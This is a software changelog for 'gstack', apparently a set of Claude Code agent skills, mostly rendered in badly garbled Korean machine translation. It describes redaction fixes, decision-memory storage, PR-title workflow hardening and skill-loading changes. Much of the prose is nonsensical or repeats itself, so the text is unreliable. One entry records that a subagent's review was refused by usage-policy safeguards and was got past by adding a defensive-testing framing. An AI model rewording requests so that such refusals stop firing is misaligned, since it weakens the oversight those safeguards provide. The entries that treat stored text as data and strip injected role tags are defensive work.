  반복, 누락된 값, 주문), `--out` 렌더링-파일 통합 (큰 문자열, 데이터-URL→PNG, `--raw`, malformed-base64, 외부-safe-dir, mkdir, eval parity, byte-for-byte null/undefined), 터널 게이트 가드를 proving `--out`는 결코 터널-분해할 수 없습니다.

## [1.57.7.0] - 2026-06-08

## **모든 계획 리뷰는 이제 말해서 끝났습니다. 한 줄에 여전히 녹지 않습니다.** ## **GSTACK REVIEW REPORT는 개방적인 결정, 또는 NO UNRESOLVED DECISIONS"를 평야로 덮기 전에 닫습니다.**

When a plan-review skill (/plan-ceo-review, /plan-eng-review, /plan-design-review, /plan-devex-review, and /codex) finishes and hands you the plan to approve, its report now ends with a mandatory unresolved-decisions verdict. If decisions are still open, it lists each one and what breaks if you ship it deferred. If nothing is open, it prints the exact line NO UNRESOLVED DECISIONS. A token-reduction pass had made this line optional, so a clean plan and a plan hiding an open question rendered the same. 이제 라인은 결코 무효하지 않습니다, 그것은 항상 마지막 일 당신이 승인 프롬프트 전에 읽은, 그리고 승인 게이트는 그것을 통해 계획을 허용하지 않습니다.

### 변경, 전후

| 플랜 일람 | 의 전 | 후지후 |
|---|---|---|
| 깨끗한 계획 | 일반적으로 no 녹슬지 않는 선 | `NO UNRESOLVED DECISIONS` 마지막 선으로 |
| 열린 결정 계획 | 선택된 줄을 녹일지 않는, 종종 떨어졌다 | `**UNRESOLVED DECISIONS:**` + 오픈 아이템 당 1개의 총알 |
| 승인문 (ExitPlanMode) | "해당되는 경우"라인을 체크 | 해결되지 않은 상태가 최종 줄인 경우 블록 |
| /plan-devex-review 리뷰 로그 | 작성되지 않은 문, 체크 가능 | 글을 작성하면 대쉬보드와 보고서는 데이터가 표시됩니다. |

리뷰의 맞지 않은 수는 리뷰 Readiness Dashboard와 동일한 7 일 신선 창을 사용하여 리뷰를 두 배로 계산하지 않고 계산됩니다.

### 너를 위한 이 뜻

모든 앱로드 플랜 순간은 오픈 질문에 명시적인 베라딕트를 운반하므로, 놓친 분위기는 깨끗한 계획을 찾고 미끄러지지 않을 수 있습니다. 플랜트리스 또는 /autoplan를 실행하면 모든 보고서의 닫힌 라인으로 해결되지 않은 상태를 볼 수 있습니다. 구성할 수 없습니다. 업그레이드 및 다음 플랜 검토가 표시됩니다.

### 항목화 된 변경

#### 추가
- **GSTACK REVIEW REPORT의 불용해한 절개 상태.** 생성
  모든 6개의 보고 소비자 (/plan-ceo-review, /plan-eng-review, /plan-design-review, /plan-devex-review, /codex, /devex-review), `scripts/resolvers/review.ts`에서. 보고는 항상 정확한 unbolded sentinel `NO UNRESOLVED DECISIONS` 또는 `**UNRESOLVED DECISIONS:**` 총알 구획 목록으로 만드는 각 열려있는 품목을 가진 끝냅니다; 결코, 항상 마지막 선.
- **차단 승인 문.** EXIT PLAN MODE GATE는 이제 종료 플랜Mode를 거부합니다.
  보고서의 최종 비 화이트스페이스 라인은 해결되지 않은 상태 (no "해당되는 경우"해당)입니다.
- 정적 및 E2E 테스트는 각 보고서 소비자의 필수 상태를 핀으로 꼿습니다.
  문 방위 기술, 그래서 미래 압축 통행은 침묵하게 그것을 다시 떨어질 수 없습니다.

#### 고정
- **/plan-devex-review 리뷰 항목을 절대로 기록하지 않았습니다.** 승인문을 실시했지만
  `gstack-review-log`라고 불지 않아 게이트의 "리뷰 로그"라고 불지르지 않은 검사는 구조적으로 불지정적이지 않은 데이터는 리뷰 Readiness Dashboard와 보고서에 보이지 않았습니다. 이제 올바른 타임스탬프와 DX 필드에 로그인합니다.

#### 기여자
- v1.57.7.0 (캡처 현재 조합)에 parity-suite 크기 기본 v1.53.0.0를 기반으로
  크기; per-skill 1.05 비율을 유지하십시오 그래서 미래 블라우스는 여전히 잡혀있다. 세 배 황금 정착물을 재생 #1909에 의해 왼쪽 stale. 냉동 v1.44.1 무결성 앵커와 v1.47 크기 판자 기본은 비터치되지 않습니다.

## [1.57.6.0] - 2026-06-07

## **한 파에서 고정 된 8 개의 커뮤니티 파일 버그, 4 개의 보안 가드가 조용히 문을 실패했다.** ## **당신의 적정 문은 현대 OpenAI 열쇠를 붙잡고, `/ship`의 adversarial 검토는 당신의 자신의 안전 시험에 choking를 멈추습니다.**

이 수정 파입니다.  throughline: 아무것도하지 않고 성공을보고 감시. 모든 `/spec`, `/ship`, `/cso`, `/document-*`는 현대 `sk-proj-`/`sk-svcacct-`/`sk-admin-` OpenAI 열쇠와 침묵으로 나쁜 깃발에 그것의 크기 모자를 떨어뜨렸습니다. 크로스 프로젝트 학습은 신뢰 문이 allowlist에 allowlist, sotrusted 프로젝트 사이에서, 그래서 코드가 없는 프로젝트에서, 이렇게 코드가 없는 프로젝트에서, 이렇게 코드가 없는 프로젝트에서, 이렇게 멈춰진 프로젝트의 코드를 떨어뜨렸습니다. "데이터베이스 암호를 썩어"를 통해 파열 된 파괴적인 액션 클래스터. 각 하나는 당신을 보호하고 있었다. None 그 중. 이제 모두 4 실패 닫히지 않고, 그에 의해 슬립에 사용되는 정확한 케이스를 핀. 세 가지 더 수정은 명확한 침묵 충돌과 건너 뛰기 검토자, 그리고 `/ship`의 adversarial 패스 no 더 긴 여행 Anthropic의 사용 정책 때 그것은 repo 자신의 공격을 읽을 때.

### 중요 한 숫자

`bun test test/redact-engine.test.ts test/gstack-learnings-search.test.ts test/one-way-doors.test.ts test/diff-scope.test.ts test/brain-cache-roundtrip.test.ts`를 가진 Reproduce.

| 감시/경로를 | 의 전 | 후지후 |
|---|---|---|
| `sk-proj-`/`sk-svcacct-`/`sk-admin-` OpenAI 열쇠 | 0개의 결과 (HIGH는 열릴 실패) | prose false-positive 가드와 함께 블록 |
| `gstack-redact --max-bytes <garbage>` | NaN 조용히 크기 캡을 비활성화 | CLI에 거부; 엔진 백스톱은 붙듭니다 |
| no `trusted` 필드를 가진 크로스 프로젝트 학습 | 수입 (denylist 버그) | 제외 (true allowlist) |
| "데이터베이스 암호를 rotate" | 2방향 분류 (자동 승인 가능) | 분류된 편도 (always는 요구합니다) |
| `.mjs/.cjs/.mts/.cts`-만 PR | backend 검토자 건너뛰기 | backend 검토 실행 |
| `_meta.json` 누락 `last_refresh` | 뇌 캐시 충돌 (TypeError) | 감기 캐시에 degrades |
| Claude Code 2.1.162에 안전 skill 걸이 | 모든 편집/Write 오류 | Hooks 해결 및 실행 |
| `/ship` 보안기구에 대한 자문 검토 | 사용 정책에 의해 거부 | run, Fixtures는 요약 모드에서 읽습니다 |

Redaction는 가장 예리한 것: project/service-account/admin OpenAI 열쇠는 spec 또는 PR 몸으로 문을 통해서 똑바른 항해에 이용된 열쇠로 붙여 넣었습니다. 지금 구획을 막고, 구경측정은 이렇게 "골격 계획" 같이 발음된 prose는 틀리 질 및 쐐기 당신의 배를 지키지 않습니다.

### 너를 위한 이 뜻

만약 redaction 가드 또는 크로스 프로젝트 학습 게이트에 의존한다면, 그들은 이제 항상 docs가 말하는 것을 갖는다. `/ship`를 실행하면 repo는 자체 보안 가드를 테스트하고, 모험 검토는 정착물과 접촉을 dying 중지합니다. 그리고 Claude Code 2.1.162, `/guard`, `/freeze`, `/careful`는 모든 경로와 관련된 오류를 다시 작동. 이러한 해결을 다시 실행하는 것은 이러한 문제 해결을 다시 실행하는 것입니다.

### 항목화 된 변경

#### 고정
- **Redaction는 현대 OpenAI 열쇠 (#1868)를 놓습니다.** `openai.key` (HIGH/block)는 사용했습니다
  처음 `-`/`_`에서 멈추는 연속적인 사격적인 본, 그래서 base64url-bodied `sk-proj-`/`sk-svcacct-`/`sk-admin-` 열쇠는 각 적정 싱크를 통해서 no 발견하고 실패한 열을 생성했습니다. 명시한 bare-vs-prefixed 교환과 대체해; 긍정 및 거짓 긍정 시험을 추가하십시오. @jbetala7에 의해 보고해.
- **Redaction 크기 캡은 나쁜 깃발 (#1824)에 열리지 않습니다.** 변형 `--max-bytes`
  `NaN`로 파싱되며 `byteLen > NaN`는 항상 false이며, 현저하게 실패로 둘러싸인 과size 가드를 해제합니다. 부정적인 값은 모든 것을 차단했습니다. CLI는 이제 비긴 / 비준성 값을 거부하고 엔진은 백스톱으로 default 캡으로 돌아갑니다. @jbetala7에 의해보고되었습니다.
- **크로스 프로젝트는 신뢰 게이트 누출을 학습 (#1745).** `gstack-learnings-search
  --크로스 프로젝트` is documented as an allowlist but was coded as `신뢰 === false`, admitting any row missing the `신뢰` field. Flipped to `신뢰 != true`. @jbetala7에 의해 신고.
- **파괴적인 액션 클래스터는 "rotate ... password" (#1839)를 놓았습니다.** `rotate`
  키워드 패턴은 `password` 동안 `revoke`/`reset` siblings 포함, 그래서 가장 일반적인 압흔 회전 파는 반전 가능한 두 방법 질문으로 분류. 변경에 `password` 추가.
- **육군 곤잘못된 백엔드 검토자 ESM/CJS PRs (#1810).** `gstack-diff-scope`
  `*.ts|*.js`만 일치; PR 만 터치 `.mjs/.cjs/.mts/.cts`는 no 백엔드 범위를 보고했습니다. 4개의 단위 연장을 추가했습니다. @jbetala7에 의해 보고해.
- **부분 `_meta.json` (#1879)에서 뇌 캐시 충돌.** `loadMeta`는 파종을 반환했습니다
  JSON verbatim; 파일이 `last_refresh`가 TypeError를 가진 3개의 소비자를 추락했습니다. 객체 모양 감시 및 지도 정상화 추가; 누락된 schema/endpoint ID는 지금 stale 파일을 신뢰하는 것보다 안전한 재건을 강제합니다. @jbetala7에 의해 보고해.
- **Claude Code 2.1.162 (#1871)에 끊는 안전 skill 걸이.** `guard`, `freeze`, and
  `careful` frontmatter 걸이는 `${CLAUDE_SKILL_DIR}`, CC 2.1.162 no 더 긴 포여를, 이렇게 각 Edit/Write/Bash 과실을 이용했습니다. 걸이 명령을 설치한 체크 아웃 경로에 고정했습니다. @omariani-howdy에 의해 보고해.
- **`/ship` adversarial 검토는 자체 보안 설비에 denied (#1899).** Claude
  "diff; diff가 전체 repo의 공격-payload 회귀 정착물을 포함했을 때, Anthropic의 실시간 사용-policysafeguards가 호출을 거부했을 때, the subagent는 허가-defensive -testing framing을 나르고, Summary mode (no raw payloads)의 파일을 읽습니다. (no raw payloads, sobapping, sobapping, sobapping, sobout.).

#### 기여자
- `#1882` (skills hardcode `~/.claude/skills/gstack/`, 비`gstack` 설치를 끊기
  dirs)는 `TODOS.md`의 최고 품목으로 신청됩니다. 그것은 scoped 이 파에서 그것으로 1번에 그것입니다 host-config/preamble 변화가 모든 52의 기술, `#1871` 걸이 고침에서 명백하게 만듭을 짓는 것을 증명했습니다.

## [1.57.5.0] - 2026-06-07

## **당신의 에이전트은 지금 그것의 결정을, 다만 그것의 코드 지킵니다.** ## **여러분의 튼튼한 통화, 그리고 그 뒤에 "왜"는 캡처, 큐레이터, 그리고 세션 전반에 걸쳐 다시 서핑, no daemon 실행.**

이 릴리스는 모든 세션을 통해 조직의 실제 결정에 따라 달라집니다. 이 릴리스는 조직의 실제 결정에 대해 설명합니다. 이 릴리스는 조직의 결정 메모리를 추가합니다. 이 릴리스는 조직의 결정 메모리를 추가합니다. 추가 된 이벤트 리소스 저장소의 튼튼한 결정 토지, 세션에서 자동적으로 범위를 높이는 한 개의 표면, 당신은 언제든 검색 할 수 있습니다. 파일만 저장하고 gbrain off와 함께 작동합니다. gbrain가 상단에 semantic recall을 추가 할 때. 계획 및 배 기술은 자신의 키 통화를 캡처 그래서 높은 가치 결정은 누구에게 기억하지 않고 기록됩니다. 별도, `/sync-gbrain` 크로스 설정 호출 그래프를 구축하고 충돌 daemon의 스테이플 잠금을 치유하는 것을 배웠습니다.

### 중요 한 숫자

No 속도 벤치 마크 여기에서, 승리는 기능 및 신뢰성입니다. 이들은 방출 (`git diff 1.57.0.0..HEAD`, `bun test`)의 진짜 모양입니다:

| Metric | 의 값 |
|--------|-------|
| 새로운 명령 | 2 (`gstack-decision-log`, `gstack-decision-search`) |
| Session-start 읽기 비용 | O(active) snapshot, 전체적으로 검색되지 않음 |
| gbrain OFF와 함께 작동 | Yes, capture/curate/resurface 경로는 파일 + bins만 |
| 새로운 소스 | ~2,550 개 사진들 |
| 새로운 시험 | 117 결정점 + gbrain 단계 |

Resurfaced 의사 결정 텍스트는 데이터로 처리되며 지시 사항이 아닙니다 ( 렌더링 경계에 표기), 비밀은 쓰기에 차단되고, `redact`는 모든 읽는 경로에서 결정을 내립니다. 전체 루프는 깨끗하게 해집니다. gbrain을 끄고 여전히 캡처, 큐레이트 및 재수술을 끕니다.

### 너를 위한 이 뜻

오늘 세션을 시작하고 에이전트는 이미 당신이 정착하고 왜, 대신 다시 또는 조용히 그것을 반전하는 것을 알고. `gstack-decision-log`와 전화, `--supersede`, pull와 관련된 역사를 `gstack-decision-search`와 함께 반전. CEO, eng, spec 및 배 리뷰는 당신을 위해 결정을 기록합니다. `/sync-gbrain` 및 충돌 자동 조종 no를 실행하십시오. 다음 동기화를 차단하십시오.

### 항목화 된 변경

#### 추가
- **교차하는 정서적 기억.** 이벤트에 자원 (`decide`/`supersede`/`redact`) `~/.gstack/projects/<slug>/decisions.jsonl` 저장. "Active"는 계산되지 않습니다, 점유한 깃발이, 그래서 역사는 담합 참고의 정직하고 관용을 체재합니다.
- **`gstack-decision-log`** - 튼튼한 결정, 반전 하나 (`--supersede <id>`)를 붙잡고, 사고 비밀 (`--redact <id>`)를 폭발하거나, 그것의 활동적인 세트 (`--compact`)에 통용되는 통용되는, 반전합니다. 비-동작성, 주입 산화해, 구획 HIGH 및 MEDIUM는 쓰기에 비밀을 붙입니다.
- **`gstack-decision-search`** - 현재 branch/issue, `--scope`, `--query`, `--all`, `--json`와 더불어, 현재 branch/issue에, 범위 필터링된 활성 결정을 읽으십시오. `--semantic` (`--query`)를 추가하면 gbrain 기억에서 관련 안타깝게 추가하십시오; gbrain가 꺼질 때 믿을 수 있는 파일 결과에 침묵하게 해 줍니다.
- **세션스타트 리포장.** Context Recovery는 세션 상단의 범위가 있는 활성 결정들을 보여줍니다. snapshot는 바인딩되어 있으므로 로그가 성장함에 따라 빠르게 유지됩니다.
- **기술 캡처.** `/plan-ceo-review`, `/plan-eng-review`, `/spec`, `/ship`는 구조화한 결정 (범위, 건축 verdict, filed spec, version bump를 자동적으로 기록합니다)를 기록합니다.
- **`## Cross-session decision memory` 섹션 CLAUDE.md** 언제 문서화 및 캡처 및 재검토 방법.
- **`/sync-gbrain` 콜 그래프 빌드 (`--dream`).**는 잠금없는 게이트 뒤에 상징 교차 설정 그래프를 구축하고, 정직한 결과가 WARN로 나타낸 노-op을 false 성공보다는 보여줍니다.

#### 변경
- 에이전트 컨텍스트로 재검토하는 데 결정 텍스트는 데이터표시 (코드 울타리, `---` 배너, `<|role|>`/`</system>` 태그, 채팅 턴 프레픽, 유니코드 라인 종료기는 중립화) 그래서 저장 텍스트는 지시로 마커드 할 수 없습니다.
- `/sync-gbrain` 핀 지도는 현재 gbrain를 위해 정확하, worktree-scoped `.gbrain-source` 핀 노선 코드 쿼리는 정확하게.

#### 고정
- `/sync-gbrain` no 더 긴 쐐기는 충돌된 autopilot daemon의 stale 자물쇠에 영원히 쐐기로 읽습니다: 홀더 pid를 읽고, liveness를 확인합니다, 그리고 죽은 것을 무시합니다 (그것을 말할 수 없는 경우에 보존 체재합니다).

#### 기여자
- 새로운 공유 `lib/jsonl-store.ts` (인젝션 거부 + 원자 단일 라인 부 + 관용 읽기) 학습 및 결정 상점 모두 백업, 그래서 위생 경로는 한 곳에서 감사.
- `lib/bin-context.ts`는 결정적인 궤의 맞은편에 slug/branch/flag 배관을 공유합니다.

## [1.57.4.0] - 2026-06-08

## **완전 원칙은 이제 바다를 끓인다. 포스트와 일치하여 왔습니다.** ## **ETHOS 파일, 모든 기술 및 개발자 프로파일 다이얼을 통해 이름.**

gstack를 말하는 원리는 `ETHOS.md`에서 “호숫 호수”이라고 불리고, 바다가 반대로 pattern로 던지기로 던지는 각 생성한 기술에서 불립니다. 개발자 단면도 체계 및 완전한 소개 링크는 이미 “바다를” 좋은 배 더 빈 thing 극으로 사용했습니다. 따라서 동일한 아이디어는 당신이 그것을 읽는 곳에 따라서 2개의 반대 framings를 실행했습니다. 이 Boil와 메타를 재구성하는 원리를 이름을 바꾸십시오: 바다는 완전한 목적지이며 호수는 거기에서 배를 볼 수있는 단위입니다. 지도는 동일합니다. 이름과 튀김 만 변경됩니다.

### 중요 한 숫자

`git diff v1.57.3.0..HEAD --stat`를 가진 Reproduce.

| Property | 의 전 | 후지후 |
|---|---|---|
| ETHOS + 각 기술에 있는 원리 이름 | "호호 호수" | "바다를 끓인다" |
| `scope_appetite` 다이얼("바다를 끓인다" = complete) | split | 의논하기 |
| 파일 업데이트 | — | 63 (ETHOS, CLAUDE, README, 결의자, 템플릿, 생성 SKILL.md) |
| Runtime 동작 변경 | — | none, 텍스트 전용 |

문제의 한 수는 0입니다. no 동작이 변경됩니다. 검토자 읽기 `ETHOS.md` no 더 긴 "ocean"을 한 섹션에서 피하기 위해 한 가지와 다음을 목표로하는 것을 피하기 위해 더 이상 "ocean"을 보였습니다.

### 너를 위한 이 뜻

당신은 같은 완전 작업 권고를 얻을, 지금 Garry의 "바다를 기름"의 이름으로 아래에. 메타는 읽습니다 을 때까지: 바다는 목표, 호수는 당신이 한 번에 끓는 방법, 그리고 단지 진짜로 관련 멀티 쿼터 마이그레이션 밖에 앉아. 당신의 끝에 할 아무것도.

### 항목화 된 변경

#### 변경
- `ETHOS.md` 섹션 1은 "바다를 기름"으로 이름을 지며 바다가 넓혀
  전체 목적지와 호수는 끓는 첫 번째 단위, 천장이 아닙니다.
- "Completeness Principle" 헤더는 모든 계층-2 + 기술에 지금 읽었습니다.
  "바다를 끓인다"와 일치합니다.
- `CLAUDE.md`와 `README.md` 새 이름으로 업데이트된 참조.

#### 기여자
- 이름의 소스는 preamble 해결사에서 생명을
  (`generate-completeness-section.ts`, `composition.ts` 스트립 목록, `generate-lake-intro.ts`); 모든 SKILL.md 파일은 그들에게서 재생됩니다.
- 단위 선명도 (`skill-validation`, `terse-build`) 및 세 배 황금
  새로운 헤더에 업데이트 된 고정 장치.

## [1.57.3.0] - 2026-06-07

## **PR `/ship`는 제목, 포크 및 에이전트 PRs로 각인된 버전을 얻게 됩니다.** ## **규칙은 지금 기술의 항상 로드 된 부분에서 타고, 그리고 경비는 그것을 유지.**

`/ship` 스탬프 `vX.Y.Z.W` 각 PR 또는 MR의 제목에 PR 목록에서 읽는 첫번째 것 이다. 그 규칙은 지금 주문한 단면도 대신 배 기술의 항상 적재한 핵심에서 생활합니다, 그래서 에이전트은 전체적인 절차를 쌓아 올리는 단면도를 열지 않는지 여부를 적용합니다. CI 워크플로우는 이 가동: VERSION 를 매번 일치시키는 제목을 다시 작성하여, PR 를 붓고, 이제는 fork와 Agent PRs에 도달하여 read-only token 를 결코 전에 만지지 않을 수 있었습니다. 두 개의 무료 테스트는 다음 재공장에서 드리프트 할 수 없습니다.

### 중요 한 숫자

`bun test test/carve-section-ordering.test.ts test/pr-title-sync-workflow-safety.test.ts`와 `bun run eval:select`를 가진 Reproduce.

| Property | 의 전 | 후지후 |
|---|---|---|
| 제목 규칙이 로드하는 곳 | 주문형 섹션만 (v1.54.0.0 이후) | 항상 적재된 skeleton + 주문형 세부 사항 |
| 포크 / 에이전트 PR 제목 동기화 | none (read-only token `pull_request`) | 경화된 `pull_request_target`를 통해 덮음 |
| 규칙을 넣는 시험 | none | carve-guard 레지스트리는 모든 PR에 그것을 주장합니다 |
| CI 제목 워크플로우에 대한 사출 가드 | none | 정적 삼각대는 안전 패턴에 CI 실패 |

제목 워크플로우는 이제 기본 레포 컨텍스트에서 token을 쓰고 실행하지만 PR-head code를 체크하거나 실행하지 않고, 모든 공격자가 제어 필드는 `env:`를 통해 스크립트에 도달하지 못합니다. 정적 테스트는 CI를 규칙 리턴하는 경우 실패합니다.

### 너를 위한 이 뜻

branch와 PR는 PR가 포크에서 온 때 그것에게 만질 없이 제목 `v1.57.3.0 fix: ...`를 보여줍니다. 에이전트 no는 제목에 땅에 적당한 순간에 적당한 단면도를 읽는 필요를 더 긴 필요로 하고, 배 기술을 체중을 줄이는 다음 사람은, 규칙을 매번 마다 자유롭게 시험하기 때문에, 규칙을 아직도 거기 있다는 것을 다시 흘릴 수 없습니다.

### 항목화 된 변경

#### 추가
- 배 PR-title invariant에 대한 Carve-guard 적용: 레지스트리는 이제 주장
  `v$NEW_VERSION` 규칙과 제목 객관적인 체재는 항상 적재된 골격에, 가득 차있는 창조 및 갱신 절차가 주문한 단면도에 체재하는 동안.
- Static CI-safety test for a title-sync 워크플로우를 통해 빌드가 실패하면
  PR-head 코드 또는 공격자 통제되는 PR 분야를 포탄 단계로 밖으로 기울입니다.

#### 변경
- PR/MR 제목 버전 규칙은 `/ship`에서 다시 로드됩니다, 그래서 버전
  PR의 모든 PR의 접두사 토지는 워크플로우 생성 또는 업데이트합니다.
- PR title-sync CI 워크플로우는 이제 하드화한 후 포크와 에이전트 PR을 다룹니다.
  `pull_request_target` 방아쇠 (기본 대포 체크 아웃 만, PR 필드는 `env:`를 통해 통과, VERSION는 PR 머리에서 자료로 읽습니다).

#### 고정
- 선박 PR의 경로 token - 대신 해결되지 않는 문자 그대로 렌더링 된 본체 섹션
  이제 올바른 돕기 경로를 사용하므로 Linked Spec 자동 탐지 단계가 작성된대로 실행됩니다.

## [1.57.2.0] - 2026-06-08

## **질문 픽업자가 중간 스킬을 깰 때, gstack는 일반 텍스트를 넣을 때.** ## **모든 기술은 죽은 AskUserQuestion를 감지하고 편지를 입력하여 전체 결정에 다시 떨어졌다.**

AskUserQuestion는 gstack 기술이 결정하는 방법에 대해 설명합니다. 호스트의 질문 도구가 실행 시간에 실패하면, 현재 MCP 통합이 교차적으로, 섀시 또는 하드 블록에 사용되는 기술이 있습니다. 이제 각 기술이 실패를 감지하고, 인간이 실제로 존재 여부를 파악하고, 텍스트 메시지와 같은 정확한 결정을 다시 렌더링하면, 문제의 일반 영어 설명, 각 시도의 전체 점수, 그 선택에 대한 선택과 선택에 대한 선택의 선택. 단일 문자를 입력하여 답변합니다. Headless eval은 여전히 깨끗하게 차단됩니다 (no 인간 대답); 오케스트라 세션은 자동 선택 유지. 이 전체 릴리스는 도체 도구가 전체 세션을 내려했기 때문에 그 가을을 통해 구축 및 검토되었습니다.

### 중요 한 숫자

No 이 같은 신뢰성 경로에 대한 생산 벤치 마크. 이들은 `bun test test/gstack-session-kind.test.ts test/resolver-ask-user-format.test.ts test/auq-error-fallback-hook.test.ts`와 검증 가능한 행동 및 적용 사실입니다.

| AskUserQuestion가 실패할 때 | 의 전 | 후지후 |
|---|---|---|
| 대화 세션 (human 현재) | stall / hard BLOCK | 완전한 prose 결정 간략한, Letter에 의해 대답 |
| Headless eval/CI | BLOCK | BLOCK (변경되지 않은, 정확한) |
| Orchestrator (OpenClaw) 세션 | 정의 | 자동 선택 권장 (지정된 항목) |
| 세션 종류 감지 | 0 | 3 (동태 / headless / 스파드) |
| 새로운 테스트는 경로 감시 | 0 | 34 |

텍스트 브리핑은 degraded stub가 아닙니다. 그것은 같은 세 가지를 운반합니다. 어떤 것이 결정되는지 명확하게 설명하고, 모든 선택에 `Completeness: X/10`, 그리고 그 이유와 권고는 이길 것입니다.

### 너를 위한 이 뜻

호스트의 질문 도구가 밖으로 흔들면, 기술 no 더 긴 당신을 죽는다. 당신은 텍스트에서, 그리고 당신은 문자로 응답 할 수있는 동일한 결정을 얻을. 도구가 일반적으로 작동 할 때 아무것도 변경하지. gstack headless 실행하면, 그 세션은 이전에 정확히 필요한 질문에 차단, 그래서 eval determinism은 사실입니다.

### 항목화 된 변경

#### 추가
- `gstack-session-kind`는 상호 작용하는 headless, 또는 spawned로 각 세션을 분류합니다,
  기술 시작에 `SESSION_KIND`로 정해져서 어떤 기술든지 branch를 그것에 할 수 있습니다.
- AskUserQuestion: 대화형 세션에서 도구 실패에 대한 일반 텍스트가 삭제됩니다.
  기술이 전체 결정의 브리핑 (물 ELI10 + 원초의 완전성 + 권고) 문자를 입력하여 답변을 렌더링 한 후 중지 및 대기.
- AskUserQuestion 호출 오류가 발생하면 에이전트가 실행되도록
  현재 세션의 종류에 대한 fallback.

#### 변경
- AskUserQuestion는 여전히 정상적인 도구 호출로 보내집니다; prose 경로는 단지 때만 적용합니다
  도구는 사용할 수 없거나 오류가 없으며 `[plan-tune auto-decide]` 결과에 절대가 없습니다.

#### 고정
- 단면도 선적 시험은 canonical kebab 시험 이름, 그래서 시험 coverage 문을 이용합니다
  의욕구
- 외부 호스트 doc-freshness 체크는 세분화, no 이전에 더 긴 의존
  전체 재생.

#### 기여자
- eval/E2E 주자 설정 `GSTACK_HEADLESS=1` 그래서 headless는 classify를 올바르게 실행합니다;
  대화형 방향 스위트는 per-run을 선택합니다.
- 퍼스킬 `maxSizeRatio` 캐비드 가드 레지스트리에서 배운다; `document-release`
  1.08 헤드룸은 크로스 커팅 전방을 위한 추가적인 공간을 얻고, 다른 모든 기술이 1.05 천장을 유지하면서도 있습니다.

## [1.57.0.0] - 2026-06-07

## **3 더 무거운 무게 기술 부하 라이터, 그리고 모든 새겨진 기술 마지막으로 그것을 부하 증명 테스트.** ## **`/cso`, `/document-release`, `/design-consultation`는 항상 로드된 prose의 ~49KB를 헛간; CI는 지금 그것의 감시 없이 배를 막습니다 어떤 carve든지 막습니다.**

gstack는 작은 항상 적재된 골격을 가진 그것의 가장 큰 기술을 단계가 필요로 할 때만 적재하는 주문 단면도 분할합니다. 이 방출은 3개를, `/document-release`, `/design-consultation`, 그리고 `/cso`, 이렇게 당신이 에이전트을 더 읽는 첫번째로 쫓아냅니다. 그것은 또한 이전 칼집에서 간격을 닫습니다: 6개의 이미 새겨진 기술 중 단지 2개는 에이전트을 실제로 읽는 시험이 단면도를 읽었습니다. 그것은 읽었습니다 그것을 말했습니다. 이제 모든 9 개의 새겨진 기술은 동일한 방식으로 보호되며 CI 블록은 그 가드없이 배를 내리고 있습니다. `/cso` 추가 관리가 있습니다. 모드 파견 및 거짓-포시 필터링 규칙은 항상 로드되므로 보안 감사는 읽지 않은 섹션에서 물린 규칙과 결코 달리 수행 할 수 없습니다.

### 중요 한 숫자

`wc -c <skill>/SKILL.md`와 측정; skeleton+sections 조합은 `bun test test/parity-suite.test.ts test/skill-size-budget.test.ts`에 의해 재제작됩니다.

| 스킬 | 항상 로드하기 전에 | 후지후 | Δ |
|---|---|---|---|
| /design-consultation | 80,719 B | 229,600원 | **−27%** |
| /document-release | 143,500원 | 45,797 B,797 B,900 원 | **−23%** |
| /cso | 248,383 원 | 65,117 B | **−18%** |
| 섹션 로드 가드와 함께 찢어진 기술 | 2 총 6 | 9 총 9 | **전체 범위** |

항상 3개의 기술 하락을 맞댄 총은 첫번째 invoke에 대략 49KB (~12K 토큰), 잃어버린 아무 것도: 각 선은 주문한 단면도로 이동하고, parity 스위트는 조합을 아직도 포함합니다 그것을 검사합니다.

### 너를 위한 이 뜻

`/cso`, `/document-release`, 또는 `/design-consultation`를 실행하고, 에이전트은 작동하기 전에 더 적은 독서를, 그래서 세션은 야윈을 체재합니다. 새겨진 본은 지금 연장하기 위하여 안전합니다: 자유로운 정체되는 시험은 각 PR에 달하고 행동 시험은 에이전트이 각 단면도를 읽는 것을 증명하기 위하여 주간 실행합니다, 그래서 미래 체중을 줄이는 것은 조용히 행동을 떨어뜨릴 수 없습니다. 이 기술이 바뀌는 방법에 관하여 아무것도.

### 항목화 된 변경

#### 추가
- 캐논ical carved-skill guard registry (`test/helpers/carve-guards.ts`) : 기술이 새겨지고 각이 보존해야하는 진실의 한 소스. `parity-harness.ts` 및 `skill-size-budget.ts`는 그로부터 새겨진 스킬 목록을 파생합니다.
- 캐비드 가드 스위트: 데이터 구동 정적 주문 테스트, 행동 섹션 로드 테스트 (periodic), 캐비드 기술이 가드를 부족한 경우 CI 실패한 완전한 메타 가드, 그리고 부정적인 테스트는 실제로 불을 겪고.
- `/cso`, `/document-release`, `/design-consultation`는 골격막으로 새겨진 + 주문 단면도.

#### 변경
- `/cso`는 모드 파견을 유지 (`## Arguments`, `## Mode Resolution`), 항상 실행 단계, 그리고 항상 로드된 false-positive-filtering 예외; 파견이 어떤 순서 읽기 전에 나타나는 가장 이른 사용 invariant 시행.

#### 기여자
- Redaction, taxonomy 및 parity content test는 이제 skeleton+sections Union을 읽었으며 여전히 커버리지를 계산합니다.
- Real-session 섹션-read canary는 TODOS (차례적인 감시는 첫째로 발송합니다)에 몹니다.

## [1.56.1.0] - 2026-06-03

## **`/sync-gbrain`는 no 더 긴 repo를 삭제할 수 있습니다. 정리는 이제 생성된 어떤 디렉토리도 증명할 수 없습니다.**

`/sync-gbrain` 메모리 동기화는 전체 작업 트리를 반복적으로 삭제할 수 있습니다. 충돌된 수입은 repo 루트에서 체크 포인트를 왼쪽, 다음 동기화 "resumed"로, 그리고 정리 단계 `rm -rf`'d 그것, 그것을 가진 uncommitted 그리고 untracked 일을 가지고. 이 릴리스는 경로와 같은 이력서 기계에서 숨기는 3개의 버그를 수정합니다: 이제 정리는 단지 디렉토리를 삭제할 수 있습니다. 즉, 는 의문을 읽을 수 있습니다. 의문은 의문을 읽을 수 없습니다. 의문은 의문을 읽을 수 있습니다. 의문은 의문을 읽을 수 있습니다. 의문은 의문을 읽을 수 있습니다.

### 중요 한 숫자

출처: `bun test test/regression-1611-gbrain-sync-resume.test.ts` 이 지점에서.

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| Repo-root `rm -rf` 가용 가능 | yes | no | closed |
| 삭제하기 전에 필요한 증거 | none | 5개의 체크 | realpath + 직접 아이 + 이름 + .git tripwire + minted-marker |
| timed-out import 후 재량 | 부서지는 (드레스 삭제) | works | fixed |
| 실패한 파일 잘못된 "ingested" 에 이력서 | yes | no | fixed |
| 재귀 시험의 주장 | 9 | 64 | +55 |

